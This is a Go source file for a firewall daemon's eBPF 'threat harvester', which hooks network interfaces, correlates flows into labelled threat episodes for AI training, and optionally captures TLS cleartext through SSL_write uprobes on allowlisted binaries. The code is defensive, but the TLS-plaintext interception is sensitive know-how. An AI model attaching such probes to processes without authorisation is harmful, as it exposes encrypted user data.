package engine

import (
	"archive/tar"
	"bufio"
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/klauspost/compress/zstd"

	axebpf "github.com/axonwall/axonwall/apps/axonwalld/ebpf"
)

const (
	harvesterEvtNetSketch     uint8 = 1
	harvesterEvtNetPayload    uint8 = 2
	harvesterEvtProcExec      uint8 = 3
	harvesterEvtProcMemfd     uint8 = 4
	harvesterEvtTlsCleartext  uint8 = 5

	harvesterAnomDarkPort     uint8 = 1 << 0
	harvesterAnomDnsEntropy   uint8 = 1 << 1
	harvesterAnomMemfdProc    uint8 = 1 << 2
	harvesterAnomWatchlistHit uint8 = 1 << 3
	harvesterAnomFirehose     uint8 = 1 << 4
	harvesterAnomTlsHello     uint8 = 1 << 5

	maxPendingHarvesterFlows   = 8192
	maxInMemoryEpisodes        = 2000
	defaultHarvesterSpoolDir   = "/var/lib/axonwall/threat-corpus"
	harvesterDefaultSftSystem  = "You are Axonwall Blackbox, an autonomous NGFW and Ring-0 eBPF threat reasoning model. Analyze the chronological telemetry episode, identify the MITRE ATT&CK technique and malicious/benign verdict, and emit the exact Axonwall MCP containment tool call when warranted."
)

// errHarvesterBpfUnavailable marks the environment-level "Ring-0 eBPF
// attach is not possible here" outcome (unprivileged process, or dev
// mode without AXONWALL_DEV_EBPF=1). ApplyConfig tolerates exactly
// this error — the API/correlator keep working in dev mode and the
// failure stays visible via SnapshotStatus.BpfLoadError — while real
// attach/detach failures on a capable host are returned (R4-A-M3).
var errHarvesterBpfUnavailable = errors.New("unprivileged or dev mode without AXONWALL_DEV_EBPF=1; Ring-0 eBPF attach skipped (pipeline & simulator active)")

// Hardcoded control-plane daemons that MUST NEVER have TLS uprobes attached.
var excludedUprobeBinaries = map[string]bool{
	"axonwalld":  true,
	"sshd":       true,
	"eluvix":     true,
	"slapd":      true,
	"vault":      true,
	"minio":      true,
	"k3s":        true,
	"containerd": true,
	"systemd":    true,
	"postgres":   true,
	"postgresql": true,
}

type ThreatTeacherLlmConfig struct {
	Enabled         bool   `json:"enabled"`
	Endpoint        string `json:"endpoint"`
	Model           string `json:"model"`
	ApiKey          string `json:"apiKey,omitempty"`
	MaxCallsPerHour int    `json:"maxCallsPerHour"`
	// R4-A-M7: when false (default) the teacher prompt is anonymized
	// with the same Crypto-PAn anonymizer as the export path. Set
	// explicitly to send raw IPs/SNI/CausalDsl to the teacher
	// endpoint (only for a local/trusted teacher).
	AllowRawTelemetry bool `json:"allowRawTelemetry,omitempty"`
}

type ThreatFleetShipperConfig struct {
	Enabled       bool   `json:"enabled"`
	Endpoint      string `json:"endpoint"`
	Region        string `json:"region"`
	Bucket        string `json:"bucket"`
	Prefix        string `json:"prefix"`
	AccessKey     string `json:"accessKey,omitempty"`
	SecretKey     string `json:"secretKey,omitempty"`
	UsePathStyle  bool   `json:"usePathStyle"`
	// R4-A-L6: explicit operator opt-in for a plaintext http:// S3
	// endpoint (e.g. local MinIO over HTTP). Default false: the
	// shipper refuses plaintext endpoints instead of silently
	// shipping the corpus readable on the wire.
	AllowPlaintextEndpoint bool   `json:"allowPlaintextEndpoint,omitempty"`
	LastShippedAt string `json:"lastShippedAt,omitempty"`
	LastShippedKey string `json:"lastShippedKey,omitempty"`
	LastError     string `json:"lastError,omitempty"`
}

type ThreatHarvesterConfig struct {
	Enabled                bool                     `json:"enabled"`
	CaptureMode            string                   `json:"captureMode"` // "adaptive" | "firehose" | "honeypot_only"
	WatchedInterfaces      []string                 `json:"watchedInterfaces"`
	FirehoseInterfaces     []string                 `json:"firehoseInterfaces"`
	FirehoseNamespaces     []string                 `json:"firehoseNamespaces"`
	CanaryPorts            []int                    `json:"canaryPorts"`
	MaxPayloadBytes        int                      `json:"maxPayloadBytes"`
	CorrelationWindowSec   int                      `json:"correlationWindowSec"`
	BenignSampleRate       float64                  `json:"benignSampleRate"`
	SpoolDir               string                   `json:"spoolDir"`
	MaxSpoolGb             int                      `json:"maxSpoolGb"`
	PinGoldEpisodes        bool                     `json:"pinGoldEpisodes"`
	EnableTlsUprobes       bool                     `json:"enableTlsUprobes"`
	AutoHoneypotTlsUprobes bool                     `json:"autoHoneypotTlsUprobes"`
	TlsUprobeAllowlist     []string                 `json:"tlsUprobeAllowlist"`
	AnonymizeOnExport      bool                     `json:"anonymizeOnExport"`
	AnonymizationSalt      string                   `json:"anonymizationSalt,omitempty"`
	TeacherLlm             ThreatTeacherLlmConfig   `json:"teacherLlm"`
	FleetShipper           ThreatFleetShipperConfig `json:"fleetShipper"`
}

func DefaultThreatHarvesterConfig() ThreatHarvesterConfig {
	return ThreatHarvesterConfig{
		Enabled:                false,
		CaptureMode:            "adaptive",
		WatchedInterfaces:      []string{},
		FirehoseInterfaces:     []string{},
		FirehoseNamespaces:     []string{},
		CanaryPorts:            []int{23, 2323, 3389, 4444, 5900, 6379, 9200, 27017},
		MaxPayloadBytes:        4096,
		CorrelationWindowSec:   45,
		BenignSampleRate:       0.005,
		SpoolDir:               defaultHarvesterSpoolDir,
		MaxSpoolGb:             10,
		PinGoldEpisodes:        true,
		EnableTlsUprobes:       false,
		AutoHoneypotTlsUprobes: true,
		TlsUprobeAllowlist:     []string{},
		AnonymizeOnExport:      true,
		TeacherLlm: ThreatTeacherLlmConfig{
			Enabled:         false,
			Endpoint:        "http://127.0.0.1:4100/v1/chat/completions",
			Model:           "qwen2.5-14b-instruct",
			MaxCallsPerHour: 30,
		},
		FleetShipper: ThreatFleetShipperConfig{
			Enabled:      false,
			Region:       "us-east-1",
			Bucket:       "axonwall-threat-corpus",
			Prefix:       "nodes/",
			UsePathStyle: true,
		},
	}
}

func normalizeThreatHarvesterConfig(cfg ThreatHarvesterConfig) ThreatHarvesterConfig {
	def := DefaultThreatHarvesterConfig()
	if cfg.CaptureMode != "adaptive" && cfg.CaptureMode != "firehose" && cfg.CaptureMode != "honeypot_only" {
		cfg.CaptureMode = def.CaptureMode
	}
	if cfg.CanaryPorts == nil {
		cfg.CanaryPorts = def.CanaryPorts
	}
	if cfg.MaxPayloadBytes <= 0 {
		cfg.MaxPayloadBytes = def.MaxPayloadBytes
	}
	if cfg.MaxPayloadBytes > 65536 {
		cfg.MaxPayloadBytes = 65536
	}
	if cfg.CorrelationWindowSec <= 0 {
		cfg.CorrelationWindowSec = def.CorrelationWindowSec
	}
	if cfg.CorrelationWindowSec > 300 {
		cfg.CorrelationWindowSec = 300
	}
	if cfg.BenignSampleRate < 0 {
		cfg.BenignSampleRate = 0
	}
	if cfg.BenignSampleRate > 1.0 {
		cfg.BenignSampleRate = 1.0
	}
	if strings.TrimSpace(cfg.SpoolDir) == "" {
		cfg.SpoolDir = def.SpoolDir
	}
	if cfg.MaxSpoolGb <= 0 {
		cfg.MaxSpoolGb = def.MaxSpoolGb
	}
	if cfg.WatchedInterfaces == nil {
		cfg.WatchedInterfaces = []string{}
	}
	if cfg.FirehoseInterfaces == nil {
		cfg.FirehoseInterfaces = []string{}
	}
	if cfg.FirehoseNamespaces == nil {
		cfg.FirehoseNamespaces = []string{}
	}
	if cfg.TlsUprobeAllowlist == nil {
		cfg.TlsUprobeAllowlist = []string{}
	}
	if strings.TrimSpace(cfg.TeacherLlm.Endpoint) == "" {
		cfg.TeacherLlm.Endpoint = def.TeacherLlm.Endpoint
	}
	if strings.TrimSpace(cfg.TeacherLlm.Model) == "" {
		cfg.TeacherLlm.Model = def.TeacherLlm.Model
	}
	if cfg.TeacherLlm.MaxCallsPerHour <= 0 {
		cfg.TeacherLlm.MaxCallsPerHour = def.TeacherLlm.MaxCallsPerHour
	}
	if strings.TrimSpace(cfg.FleetShipper.Region) == "" {
		cfg.FleetShipper.Region = def.FleetShipper.Region
	}
	if strings.TrimSpace(cfg.FleetShipper.Bucket) == "" {
		cfg.FleetShipper.Bucket = def.FleetShipper.Bucket
	}
	return cfg
}

// IsBinaryAllowedForTlsUprobe enforces strict safety gating on TLS cleartext uprobes.
// Control-plane daemons (axonwalld, sshd, eluvix, vault, slapd, minio, k3s, containerd, systemd)
// are unconditionally rejected even if matching wildcard or allowlist entries.
func IsBinaryAllowedForTlsUprobe(exePath, comm string, allowlist []string, isHoneypot, autoHoneypot bool) bool {
	baseExe := strings.ToLower(strings.TrimSpace(filepath.Base(exePath)))
	normComm := strings.ToLower(strings.TrimSpace(comm))
	lowerFull := strings.ToLower(strings.TrimSpace(exePath))

	if baseExe == "." || baseExe == "/" {
		baseExe = ""
	}
	if baseExe == "" && normComm == "" {
		return false
	}
	for excluded := range excludedUprobeBinaries {
		if baseExe == excluded || normComm == excluded {
			return false
		}
		if strings.HasPrefix(baseExe, excluded+"-") || strings.Contains(lowerFull, "/"+excluded+"/") {
			return false
		}
	}
	if isHoneypot && autoHoneypot {
		return true
	}
	for _, entry := range allowlist {
		clean := strings.TrimSpace(entry)
		if clean == "" || clean == "*" {
			continue // Never honor dangerous wildcards
		}
		lowerEntry := strings.ToLower(clean)
		entryBase := strings.ToLower(filepath.Base(clean))
		if excludedUprobeBinaries[entryBase] {
			continue
		}
		if lowerFull == lowerEntry || baseExe == entryBase || (normComm != "" && normComm == entryBase) {
			return true
		}
	}
	return false
}

type ThreatEpisode struct {
	ID                 string   `json:"id"`
	CreatedAt          string   `json:"createdAt"`
	TimestampUnixMs    int64    `json:"timestampUnixMs"`
	LabelTier          string   `json:"labelTier"`    // "gold_malicious" | "silver_malicious" | "benign_sampled" | "unlabeled_anomaly"
	ReviewStatus       string   `json:"reviewStatus"` // "pending" | "approved_malicious" | "marked_benign" | "pinned_gold"
	Pinned             bool     `json:"pinned"`
	// R4-A-M5: true for episodes built by InjectSimulatedEpisode.
	// Simulated episodes exercise the pipeline but are not real
	// telemetry: they are excluded from the exported training corpus
	// (ExportCorpusTarZst / ShipCorpusToS3) so test data can never
	// poison a model as labelled ground truth.
	Simulated          bool     `json:"simulated,omitempty"`
	VerdictScore       float64  `json:"verdictScore"`
	OracleSources      []string `json:"oracleSources"`
	MitreAttack        []string `json:"mitreAttack"`
	SrcIP              string   `json:"srcIp"`
	DstIP              string   `json:"dstIp"`
	SrcPort            uint16   `json:"srcPort"`
	DstPort            uint16   `json:"dstPort"`
	Proto              uint8    `json:"proto"`
	ProtoName          string   `json:"protoName"`
	PktCount           uint32   `json:"pktCount"`
	ByteCount          uint64   `json:"byteCount"`
	DurationMs         float64  `json:"durationMs"`
	DnsEntropy         float64  `json:"dnsEntropy"`
	JA4T               string   `json:"ja4t"`
	SNI                string   `json:"sni,omitempty"`
	CgroupID           uint64   `json:"cgroupId"`
	ProcComm           string   `json:"procComm,omitempty"`
	ProcPid            uint32   `json:"procPid,omitempty"`
	MemfdExec          bool     `json:"memfdExec"`
	RedactionCount     int      `json:"redactionCount"`
	PktSizes           []int16  `json:"pktSizes"`
	IatUs              []uint32 `json:"iatUs"`
	ScrubbedPayload    string   `json:"scrubbedPayload,omitempty"`
	CausalDsl          string   `json:"causalDsl"`
	ReasoningTrace     string   `json:"reasoningTrace"`
	RecommendedMcpTool string   `json:"recommendedMcpTool,omitempty"`
	SpoolBytes         int64    `json:"spoolBytes"`
}

type ThreatHarvesterStats struct {
	PacketsSeen        uint64 `json:"packetsSeen"`
	Tier0Events        uint64 `json:"tier0Events"`
	Tier1PayloadEvents uint64 `json:"tier1PayloadEvents"`
	RingbufDrops       uint64 `json:"ringbufDrops"`
	DarkPortHits       uint64 `json:"darkPortHits"`
	MemfdAlerts        uint64 `json:"memfdAlerts"`
	TlsUprobeEvents    uint64 `json:"tlsUprobeEvents"`
	TotalEpisodes      int    `json:"totalEpisodes"`
	GoldEpisodes       int    `json:"goldEpisodes"`
	SilverEpisodes     int    `json:"silverEpisodes"`
	BenignEpisodes     int    `json:"benignEpisodes"`
	PinnedEpisodes     int    `json:"pinnedEpisodes"`
	PendingReview      int    `json:"pendingReview"`
	RedactedSecrets    uint64 `json:"redactedSecrets"`
	// R4-A-L7: episodes FlushReadyFlows failed to record (spool
	// write failures). Surfaced here so a quietly shrinking corpus
	// is visible instead of silently under-reported.
	RecordFailures      uint64 `json:"recordFailures"`
	SpoolUsedBytes     int64  `json:"spoolUsedBytes"`
	SpoolQuotaBytes    int64  `json:"spoolQuotaBytes"`
	ZfsBacked          bool   `json:"zfsBacked"`
	BackpressureTripped bool  `json:"backpressureTripped"`
}

type ThreatHarvesterStatusSnapshot struct {
	Config                ThreatHarvesterConfig `json:"config"`
	BpfAttached           bool                  `json:"bpfAttached"`
	AttachedInterfaces    []string              `json:"attachedInterfaces"`
	ActiveHooks           []string              `json:"activeHooks"`
	ExcludedUprobeDaemons []string              `json:"excludedUprobeDaemons"`
	BpfLoadError          string                `json:"bpfLoadError,omitempty"`
	Stats                 ThreatHarvesterStats  `json:"stats"`
	Timestamp             string                `json:"timestamp"`
}

type pendingFlowRecord struct {
	key            axebpf.ThreatHarvesterHarvesterFlowKey
	firstSeen      time.Time
	lastSeen       time.Time
	socketCookie   uint64
	cgroupID       uint64
	pktCount       uint32
	byteCount      uint64
	pktSizes       [16]int16
	iatUs          [16]uint32
	ja4t           string
	sni            string
	procComm       string
	procPid        uint32
	memfdExec      bool
	darkPortHit    bool
	watchlistHit   bool
	dnsEntropyHigh bool
	firehose       bool
	tlsCleartext   bool
	redactions     int
	payloadBuf     bytes.Buffer
	timeline       []string
}

type ThreatHarvesterManager struct {
	mu           sync.RWMutex
	cfg          ThreatHarvesterConfig
	ebpfMgr      *EBPFManager
	lsmMgr       *LsmGuardManager
	vigilanteMgr *VigilanteManager
	mcpMgr       *McpTrafficManager

	objs        axebpf.ThreatHarvesterObjects
	links       []link.Link
	ringReader  *ringbuf.Reader
	bpfLoaded   bool
	bpfLoadErr  string
	attachedIfs []string
	activeHooks []string

	// R4-A-M3: per-interface / per-binary attach bookkeeping so a
	// config change can detach removed interfaces (and uprobes) and
	// attach new ones instead of only attaching once. The links are
	// also tracked in m.links (closed by detachBpfLocked); the maps
	// are the reconcile index.
	tcxLinks    map[string][]link.Link
	uprobeLinks map[string]link.Link

	recordFailures atomic.Uint64 // R4-A-L7: cumulative RecordEpisode failures from FlushReadyFlows

	pendingMu     sync.Mutex
	pendingFlows  map[string]*pendingFlowRecord
	recentProcCgs map[uint64]procContextMeta

	episodes []ThreatEpisode

	stopCh              chan struct{}
	stopOnce            sync.Once
	workerOnce          sync.Once
	backpressureActive  atomic.Bool
	backpressureCooloff time.Time

	teacherMu       sync.Mutex
	teacherCallHist []time.Time

	eveOffset atomic.Int64

	// Test/override knobs (0 in production -> use MaxSpoolGb * 1GiB)
	spoolQuotaBytesOverride int64
}

type procContextMeta struct {
	comm      string
	pid       uint32
	memfd     bool
	updatedAt time.Time
}

func NewThreatHarvesterManager(ebpfMgr *EBPFManager, lsmMgr *LsmGuardManager, vigilanteMgr *VigilanteManager, mcpMgr *McpTrafficManager) *ThreatHarvesterManager {
	cfg := DefaultThreatHarvesterConfig()
	mgr := &ThreatHarvesterManager{
		cfg:           cfg,
		ebpfMgr:       ebpfMgr,
		lsmMgr:        lsmMgr,
		vigilanteMgr:  vigilanteMgr,
		mcpMgr:        mcpMgr,
		pendingFlows:  make(map[string]*pendingFlowRecord),
		recentProcCgs: make(map[uint64]procContextMeta),
		episodes:      make([]ThreatEpisode, 0, 128),
		tcxLinks:      make(map[string][]link.Link),
		uprobeLinks:   make(map[string]link.Link),
		stopCh:        make(chan struct{}),
	}
	mgr.loadIndexLocked()
	mgr.ensureBackgroundLoops()
	return mgr
}

func (m *ThreatHarvesterManager) ensureBackgroundLoops() {
	m.workerOnce.Do(func() {
		go m.correlationLoop()
	})
}

// Stop halts background harvester loops and detaches any loaded Ring-0 eBPF links.
func (m *ThreatHarvesterManager) Stop() {
	m.stopOnce.Do(func() {
		close(m.stopCh)
	})
	m.mu.Lock()
	m.detachBpfLocked()
	m.mu.Unlock()
}

func resolveEvalSymlinksWithTail(target string) (string, error) {
	clean := filepath.Clean(target)
	var tail []string
	cur := clean
	for {
		resolved, err := filepath.EvalSymlinks(cur)
		if err == nil {
			for i := len(tail) - 1; i >= 0; i-- {
				resolved = filepath.Join(resolved, tail[i])
			}
			return resolved, nil
		}
		if !os.IsNotExist(err) {
			return "", err
		}
		parent := filepath.Dir(cur)
		if parent == cur {
			return clean, nil
		}
		tail = append(tail, filepath.Base(cur))
		cur = parent
	}
}

func validateHarvesterSpoolDir(raw string) (string, error) {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		trimmed = defaultHarvesterSpoolDir
	}
	if !filepath.IsAbs(trimmed) {
		return "", fmt.Errorf("harvester spoolDir %q must be an absolute path", trimmed)
	}
	for _, seg := range strings.Split(filepath.ToSlash(trimmed), "/") {
		if seg == ".." {
			return "", fmt.Errorf("harvester spoolDir %q must not contain '..'", trimmed)
		}
	}
	resolved, err := resolveEvalSymlinksWithTail(trimmed)
	if err != nil {
		return "", fmt.Errorf("harvester spoolDir %q resolution failed: %w", trimmed, err)
	}
	allowedRoots := []string{"/var/lib/axonwall", "/mnt"}
	if tmpDir := os.TempDir(); tmpDir != "" {
		if resolvedTmp, err := resolveEvalSymlinksWithTail(tmpDir); err == nil {
			allowedRoots = append(allowedRoots, resolvedTmp)
		} else {
			allowedRoots = append(allowedRoots, filepath.Clean(tmpDir))
		}
	}
	for _, root := range allowedRoots {
		if resolved == root || strings.HasPrefix(resolved, root+string(os.PathSeparator)) {
			return resolved, nil
		}
	}
	return "", fmt.Errorf("harvester spoolDir %q (%s) must reside under /var/lib/axonwall, /mnt, or temp dir", trimmed, resolved)
}

func (m *ThreatHarvesterManager) indexFilePathLocked() string {
	return filepath.Join(m.cfg.SpoolDir, "episodes-index.json")
}

func (m *ThreatHarvesterManager) episodeZstPathLocked(id string) string {
	return filepath.Join(m.cfg.SpoolDir, "episodes", id+".jsonl.zst")
}

func (m *ThreatHarvesterManager) episodeParquetPathLocked(id string) string {
	return filepath.Join(m.cfg.SpoolDir, "episodes", id+".parquet")
}

// validThreatEpisodeID admits only the server-generated episode ID
// shapes (`ep-<millis>`, `ep-<millis>-<hex>`, `sim-<scenario>-<millis>`).
// R4-A-L1: ReviewEpisode used to take the id straight from API JSON
// into filepath.Join, so `../../x` escaped the spool dir and the
// delete action could remove arbitrary *.jsonl.zst / *.parquet files.
var validThreatEpisodeIDRe = regexp.MustCompile(`^(ep-[0-9]+(-[0-9a-f]{1,8})?|sim-[a-z0-9-]+-[0-9]+)$`)

func validThreatEpisodeID(id string) bool {
	return validThreatEpisodeIDRe.MatchString(id)
}

func (m *ThreatHarvesterManager) loadIndexLocked() {
	idxPath := m.indexFilePathLocked()
	b, err := os.ReadFile(idxPath)
	if err != nil || len(b) == 0 {
		return
	}
	var loaded []ThreatEpisode
	if err := json.Unmarshal(b, &loaded); err == nil {
		m.episodes = loaded
	}
}

func (m *ThreatHarvesterManager) saveIndexLocked() error {
	if err := os.MkdirAll(filepath.Join(m.cfg.SpoolDir, "episodes"), 0750); err != nil {
		return err
	}
	b, err := json.MarshalIndent(m.episodes, "", "  ")
	if err != nil {
		return err
	}
	tmp := m.indexFilePathLocked() + ".tmp"
	if err := os.WriteFile(tmp, b, 0640); err != nil {
		return err
	}
	return os.Rename(tmp, m.indexFilePathLocked())
}

func isMountZfs(dir string) (bool, string) {
	data, err := os.ReadFile("/proc/self/mountinfo")
	if err != nil {
		return false, ""
	}
	abs, _ := filepath.Abs(dir)
	bestLen := -1
	bestFs := ""
	bestSrc := ""
	for _, line := range strings.Split(string(data), "\n") {
		parts := strings.Split(line, " - ")
		if len(parts) != 2 {
			continue
		}
		left := strings.Fields(parts[0])
		right := strings.Fields(parts[1])
		if len(left) < 5 || len(right) < 2 {
			continue
		}
		mnt := left[4]
		if strings.HasPrefix(abs, mnt) && len(mnt) > bestLen {
			bestLen = len(mnt)
			bestFs = right[0]
			bestSrc = right[1]
		}
	}
	return bestFs == "zfs", bestSrc
}

func (m *ThreatHarvesterManager) ensureSpoolStorageLocked() {
	dir := m.cfg.SpoolDir
	_ = os.MkdirAll(filepath.Join(dir, "episodes"), 0750)
	if os.Geteuid() != 0 {
		return
	}
	zfsBacked, parentDs := isMountZfs(filepath.Dir(dir))
	if !zfsBacked || parentDs == "" || !validPoolDatasetRegex.MatchString(parentDs) {
		return
	}
	childDs := parentDs + "/threat-corpus"
	if _, err := exec.LookPath("zfs"); err != nil {
		return
	}
	if err := exec.Command("zfs", "list", "-H", "-o", "name", childDs).Run(); err != nil {
		quotaProp := fmt.Sprintf("refquota=%dG", m.cfg.MaxSpoolGb)
		_ = exec.Command("zfs", "create", "-p",
			"-o", "compression=zstd",
			"-o", "atime=off",
			"-o", quotaProp,
			"-o", "mountpoint="+dir,
			childDs,
		).Run()
		_ = os.MkdirAll(filepath.Join(dir, "episodes"), 0750)
	}
}

func (m *ThreatHarvesterManager) quotaLimitBytesLocked() int64 {
	if m.spoolQuotaBytesOverride > 0 {
		return m.spoolQuotaBytesOverride
	}
	gb := m.cfg.MaxSpoolGb
	if gb <= 0 {
		gb = 10
	}
	return int64(gb) * 1024 * 1024 * 1024
}

func (m *ThreatHarvesterManager) computeSpoolBytesLocked() int64 {
	var total int64
	_ = filepath.Walk(m.cfg.SpoolDir, func(_ string, info os.FileInfo, err error) error {
		if err == nil && info != nil && !info.IsDir() {
			total += info.Size()
		}
		return nil
	})
	return total
}

// ApplyConfig reconciles config, spool ZFS/directory quota, and eBPF attachment state.
func (m *ThreatHarvesterManager) ApplyConfig(rawJSON []byte) error {
	var nextCfg ThreatHarvesterConfig
	if len(bytes.TrimSpace(rawJSON)) > 0 {
		if err := json.Unmarshal(rawJSON, &nextCfg); err != nil {
			return fmt.Errorf("invalid threat harvester config JSON: %w", err)
		}
	} else {
		nextCfg = DefaultThreatHarvesterConfig()
	}
	nextCfg = normalizeThreatHarvesterConfig(nextCfg)
	validatedSpool, err := validateHarvesterSpoolDir(nextCfg.SpoolDir)
	if err != nil {
		return err
	}
	nextCfg.SpoolDir = validatedSpool

	m.mu.Lock()
	defer m.mu.Unlock()

	oldSpool := m.cfg.SpoolDir
	m.cfg = nextCfg
	if nextCfg.SpoolDir != oldSpool {
		m.loadIndexLocked()
	}
	m.ensureSpoolStorageLocked()

	if !nextCfg.Enabled {
		m.detachBpfLocked()
		return nil
	}

	if err := m.syncOrAttachBpfLocked(); err != nil {
		m.bpfLoadErr = err.Error()
		// R4-A-M3: a real attach/detach failure is now returned
		// instead of swallowed — the operator changed the watched
		// interfaces and the API must not claim success while the
		// new interfaces are not harvested. Only the
		// environment-level "no BPF here" outcome stays tolerated
		// (dev mode keeps the API/correlator functional).
		if errors.Is(err, errHarvesterBpfUnavailable) {
			log.Printf("[ThreatHarvester] Warning configuring Ring-0 eBPF hooks: %v", err)
			return nil
		}
		return fmt.Errorf("threat harvester eBPF attach/detach failed: %w", err)
	}
	m.bpfLoadErr = ""
	return nil
}

// SetEnabled enables or disables the harvester, attaching or detaching
// the Ring-0 eBPF hooks. It is the wiring point for the
// ebpf-threat-harvester plugin toggle (R4-A-M4): it returns the attach
// error instead of reporting success while nothing runs. On failure the
// enabled flag is rolled back so the manager state matches reality.
func (m *ThreatHarvesterManager) SetEnabled(enabled bool) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.cfg.Enabled = enabled
	if !enabled {
		m.detachBpfLocked()
		m.bpfLoadErr = ""
		return nil
	}
	m.ensureSpoolStorageLocked()
	if err := m.syncOrAttachBpfLocked(); err != nil {
		m.cfg.Enabled = false
		m.bpfLoadErr = err.Error()
		return err
	}
	m.bpfLoadErr = ""
	return nil
}

func (m *ThreatHarvesterManager) UpdateConfig(next ThreatHarvesterConfig) error {
	b, err := json.Marshal(next)
	if err != nil {
		return err
	}
	return m.ApplyConfig(b)
}

func (m *ThreatHarvesterManager) detachBpfLocked() {
	if m.ringReader != nil {
		_ = m.ringReader.Close()
		m.ringReader = nil
	}
	for _, lk := range m.links {
		if lk != nil {
			_ = lk.Close()
		}
	}
	m.links = nil
	m.activeHooks = nil
	m.attachedIfs = nil
	m.tcxLinks = make(map[string][]link.Link)
	m.uprobeLinks = make(map[string]link.Link)
	if m.bpfLoaded {
		_ = m.objs.Close()
		m.bpfLoaded = false
	}
}

func (m *ThreatHarvesterManager) resolveAttachInterfacesLocked() []string {
	seen := make(map[string]bool)
	var ifaces []string
	for _, name := range append(append([]string{}, m.cfg.WatchedInterfaces...), m.cfg.FirehoseInterfaces...) {
		clean := strings.TrimSpace(name)
		if clean == "" || seen[clean] {
			continue
		}
		seen[clean] = true
		ifaces = append(ifaces, clean)
	}
	if len(ifaces) == 0 && m.ebpfMgr != nil {
		snap := m.ebpfMgr.GetDataplaneSnapshot(1)
		for _, name := range snap.AttachedInterfaces {
			if name != "" && !seen[name] {
				seen[name] = true
				ifaces = append(ifaces, name)
			}
		}
	}
	if len(ifaces) == 0 {
		netIfs, err := net.Interfaces()
		if err == nil {
			for _, nif := range netIfs {
				if (nif.Flags&net.FlagLoopback) != 0 || (nif.Flags&net.FlagUp) == 0 {
					continue
				}
				if !seen[nif.Name] {
					seen[nif.Name] = true
					ifaces = append(ifaces, nif.Name)
				}
			}
		}
	}
	sort.Strings(ifaces)
	return ifaces
}

// attachTcxLocked attaches TCX ingress+egress on one interface and
// records the links for later reconcile (R4-A-M3). Success is at least
// one direction attached — the initial-attach tolerance: a single bad
// interface must not fail the whole harvester start. An error is
// returned only when both directions fail.
func (m *ThreatHarvesterManager) attachTcxLocked(ifName string) error {
	nif, err := net.InterfaceByName(ifName)
	if err != nil {
		return fmt.Errorf("interface %s not found: %w", ifName, err)
	}
	var attached []link.Link
	var errs []error
	inLk, errIn := link.AttachTCX(link.TCXOptions{
		Interface: nif.Index,
		Program:   m.objs.TcHarvesterIngress,
		Attach:    ebpf.AttachTCXIngress,
	})
	if errIn == nil {
		m.links = append(m.links, inLk)
		m.activeHooks = append(m.activeHooks, "tcx_ingress:"+ifName)
		attached = append(attached, inLk)
	} else {
		errs = append(errs, fmt.Errorf("tcx ingress on %s: %w", ifName, errIn))
	}
	egLk, errEg := link.AttachTCX(link.TCXOptions{
		Interface: nif.Index,
		Program:   m.objs.TcHarvesterEgress,
		Attach:    ebpf.AttachTCXEgress,
	})
	if errEg == nil {
		m.links = append(m.links, egLk)
		m.activeHooks = append(m.activeHooks, "tcx_egress:"+ifName)
		attached = append(attached, egLk)
	} else {
		errs = append(errs, fmt.Errorf("tcx egress on %s: %w", ifName, errEg))
	}
	if len(attached) == 0 {
		return errors.Join(errs...)
	}
	m.tcxLinks[ifName] = attached
	m.attachedIfs = append(m.attachedIfs, ifName)
	return nil
}

// detachTcxLocked closes the TCX links for one interface and drops all
// of its bookkeeping (links, attachedIfs, activeHooks) so a later
// detachBpfLocked never double-closes a link.
func (m *ThreatHarvesterManager) detachTcxLocked(ifName string) error {
	links, ok := m.tcxLinks[ifName]
	if !ok {
		return nil
	}
	var errs []error
	for _, lk := range links {
		if lk == nil {
			continue
		}
		if err := lk.Close(); err != nil {
			errs = append(errs, fmt.Errorf("close tcx link on %s: %w", ifName, err))
		}
		m.removeLinkLocked(lk)
	}
	delete(m.tcxLinks, ifName)
	m.attachedIfs = removeStrings(m.attachedIfs, ifName)
	m.activeHooks = removeStrings(m.activeHooks, "tcx_ingress:"+ifName, "tcx_egress:"+ifName)
	return errors.Join(errs...)
}

// attachTlsUprobeLocked attaches the guarded SSL_write uprobe for one
// allowlisted binary and records it for reconcile. A binary the policy
// excludes is skipped silently (nil) — that is a policy decision, not
// an attach failure.
func (m *ThreatHarvesterManager) attachTlsUprobeLocked(candidate string) error {
	if !IsBinaryAllowedForTlsUprobe(candidate, filepath.Base(candidate), m.cfg.TlsUprobeAllowlist, false, m.cfg.AutoHoneypotTlsUprobes) {
		return nil
	}
	ex, err := link.OpenExecutable(candidate)
	if err != nil {
		return fmt.Errorf("open executable %s for TLS uprobe: %w", candidate, err)
	}
	up, err := ex.Uprobe("SSL_write", m.objs.UprobeHarvesterSslWrite, nil)
	if err != nil {
		return fmt.Errorf("attach SSL_write uprobe on %s: %w", candidate, err)
	}
	m.links = append(m.links, up)
	m.activeHooks = append(m.activeHooks, "uprobe/SSL_write:"+filepath.Base(candidate))
	m.uprobeLinks[candidate] = up
	return nil
}

// detachTlsUprobeLocked closes the SSL_write uprobe for one binary and
// drops its bookkeeping.
func (m *ThreatHarvesterManager) detachTlsUprobeLocked(candidate string) error {
	up, ok := m.uprobeLinks[candidate]
	if !ok {
		return nil
	}
	err := up.Close()
	m.removeLinkLocked(up)
	delete(m.uprobeLinks, candidate)
	m.activeHooks = removeStrings(m.activeHooks, "uprobe/SSL_write:"+filepath.Base(candidate))
	if err != nil {
		return fmt.Errorf("close TLS uprobe on %s: %w", candidate, err)
	}
	return nil
}

// removeLinkLocked drops one link from the master list (used by the
// reconcile detaches so detachBpfLocked never closes it twice).
func (m *ThreatHarvesterManager) removeLinkLocked(target link.Link) {
	if target == nil {
		return
	}
	kept := make([]link.Link, 0, len(m.links))
	for _, lk := range m.links {
		if lk != target {
			kept = append(kept, lk)
		}
	}
	m.links = kept
}

func removeStrings(list []string, drop ...string) []string {
	if len(drop) == 0 {
		return list
	}
	dropSet := make(map[string]bool, len(drop))
	for _, d := range drop {
		dropSet[d] = true
	}
	kept := make([]string, 0, len(list))
	for _, s := range list {
		if !dropSet[s] {
			kept = append(kept, s)
		}
	}
	return kept
}

